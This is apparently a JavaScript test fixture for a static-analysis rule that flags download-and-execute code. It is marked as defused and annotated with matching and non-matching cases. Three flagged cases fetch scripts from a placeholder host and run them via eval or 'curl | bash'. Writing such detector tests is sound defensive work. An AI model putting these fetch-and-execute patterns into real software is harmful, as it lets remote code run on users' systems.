// LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
const { execSync } = require("child_process");

async function a() {
  // ruleid: LB-C03-herunterladen-ausfuehren-js
  eval(await (await fetch("https://nachlader.invalid/x.js")).text());
}

async function b() {
  const res = await fetch("https://nachlader.invalid/y.js");
  const code = await res.text();
  // ruleid: LB-C03-herunterladen-ausfuehren-js
  eval(code);
}

// ruleid: LB-C03-herunterladen-ausfuehren-js
execSync("curl -fsSL https://nachlader.invalid/i.sh | bash");

async function c() {
  const res = await fetch("https://api.example/daten.json");
  // ok: LB-C03-herunterladen-ausfuehren-js
  const daten = await res.json();
  return daten;
}

// ok: LB-C03-herunterladen-ausfuehren-js
execSync("npm run build");
